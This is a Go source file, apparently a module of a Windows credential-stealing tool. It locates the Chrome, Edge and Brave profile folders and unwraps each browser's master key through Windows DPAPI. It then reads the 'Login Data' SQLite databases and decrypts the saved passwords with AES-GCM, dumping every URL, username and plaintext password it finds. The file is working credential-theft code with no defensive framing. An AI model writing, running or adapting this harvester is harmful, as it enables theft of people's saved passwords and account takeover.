//go:build windows

package windows

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var (
	crypt32      = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(data []byte) *DATA_BLOB {
	if len(data) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	in := NewBlob(data)
	out := NewBlob(nil)
	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(in)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(out)),
	)
	if ret == 0 {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(out.pbData)))
	return out.ToByteArray(), nil
}

func getMasterKey(path string) ([]byte, error) {
	jsonFile, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer jsonFile.Close()

	byteValue, _ := ioutil.ReadAll(jsonFile)
	var result map[string]interface{}
	json.Unmarshal(byteValue, &result)

	encryptedKey, _ := base64.StdEncoding.DecodeString(result["os_crypt"].(map[string]interface{})["encrypted_key"].(string))
	encryptedKey = encryptedKey[5:] // Remove "DPAPI" prefix
	return Decrypt(encryptedKey)
}
func DumpBrowsers() string {
	var buffer bytes.Buffer
	profiles := []string{
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data",
		os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data",
		os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
	}

	for _, path := range profiles {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			browserName := filepath.Base(filepath.Dir(path))
			buffer.WriteString(fmt.Sprintf("--- %s ---\n", browserName))

			masterKey, err := getMasterKey(path + "\\Local State")
			if err != nil {
				continue
			}

			var loginDataPaths []string
			filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
				if !info.IsDir() && info.Name() == "Login Data" {
					loginDataPaths = append(loginDataPaths, path)
				}
				return nil
			})

			for _, loginDataPath := range loginDataPaths {
				buffer.WriteString(dumpLogins(loginDataPath, masterKey))
			}
		}
	}
	return buffer.String()
}
func dumpLogins(path string, masterKey []byte) string {
	var buffer bytes.Buffer
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return ""
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		rows.Scan(&url, &username, &encryptedPassword)
		if len(encryptedPassword) > 0 {
			decrypted, err := decryptPassword(encryptedPassword, masterKey)
			if err == nil {
				buffer.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\n\n", url, username, decrypted))
			}
		}
	}
	return buffer.String()
}

func decryptPassword(encrypted, masterKey []byte) (string, error) {
	if len(encrypted) < 15 {
		return "", fmt.Errorf("invalid encrypted data")
	}

	iv := encrypted[3:15]
	payload := encrypted[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	decrypted, err := gcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}
